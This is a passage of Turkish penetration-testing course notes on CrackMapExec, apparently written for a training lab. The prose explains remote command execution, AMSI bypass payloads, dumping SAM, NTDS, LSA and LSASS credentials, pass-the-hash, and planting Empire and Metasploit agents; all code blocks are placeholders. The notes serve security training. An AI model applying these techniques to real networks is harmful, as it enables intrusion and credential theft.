{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

